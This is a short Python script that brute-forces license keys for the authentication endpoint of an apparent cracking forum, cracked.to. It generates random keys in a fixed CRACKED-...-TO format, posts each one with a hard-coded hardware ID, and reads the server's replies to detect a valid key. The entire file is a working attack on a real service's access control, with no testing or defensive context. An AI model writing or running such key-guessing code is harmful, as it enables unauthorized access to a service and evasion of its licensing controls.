import random 
import string
import requests
import time
while True:
	letters = string.digits + string.ascii_uppercase 
	randomString1 =  ''.join(random.choice(letters)  for i in range(5))
	randomString2 = randomString1 + "-"+''.join(random.choice(letters)  for i in range(5))
	randomString3 = randomString2 + "-"+''.join(random.choice(letters)  for i in range(5))
	randomString = randomString3 + "-"+''.join(random.choice(letters)  for i in range(5))
	nitroscode = "https://cracked.to/auth.php"
	data = {
	"a":"auth",
	"k":"CRACKED-" + randomString + "-TO",
	"hwid":"A058DA91"	
	}
	r = requests.post(nitroscode, data=data)
	if 'invalid key"}' in r.text:
		print("Dont Work Code "+ randomString)
		time.sleep(2)
	elif 'invalid hwid"}' in r.text:
		print("Work Code")
		time.sleep(15) #
		exit()		
	elif '{"auth":true,' in r.text:
		print("Work Code " + randomString)
		time.sleep(2)
		exit()
